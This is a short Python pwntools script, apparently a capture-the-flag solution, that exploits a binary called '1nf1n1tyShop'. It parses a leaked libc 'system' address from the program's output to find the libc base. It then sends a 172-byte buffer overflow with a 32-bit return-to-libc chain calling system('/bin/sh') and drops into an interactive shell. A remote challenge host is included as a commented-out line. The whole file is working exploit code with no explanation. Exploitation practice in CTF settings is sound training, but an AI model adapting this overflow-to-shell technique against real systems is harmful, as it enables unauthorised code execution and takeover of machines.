from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
encode = lambda e: e if type(e) == bytes else str(e).encode()
hexleak = lambda l: int(l[:-1] if l[-1] == '\n' else l, 16)
fixleak = lambda l: unpack(l[:-1].ljust(8, b"\x00"))

p=process("./1nf1n1tyShop")
libc = ELF("./libc.so.6")  
# p=remote('pwn.1nf1n1ty.team',31798)
p.recvuntil(b">")
p.sendline(b"hacker")
p.recvuntil(b":)")
p.sendline(b"4")
p.recvuntil(b"prize: ")

system=int(p.recvuntil(b";").strip(b";").decode(),16)

p.sendline(b"2")
p.recvuntil(b"like?\n")
p.recvuntil(b">")

libc.address = system - libc.symbols['system']

exit = libc.symbols['exit']
sh = next(libc.search(b"/bin/sh"))

log.info(f"system address => {hex(system)}")

log.info(f"libc address => {hex(libc.address)}")

payload = b'a'* 172
payload += p32(system) 
payload += p32(0x00) 
payload += p32(sh)

p.sendline(payload)
p.interactive()


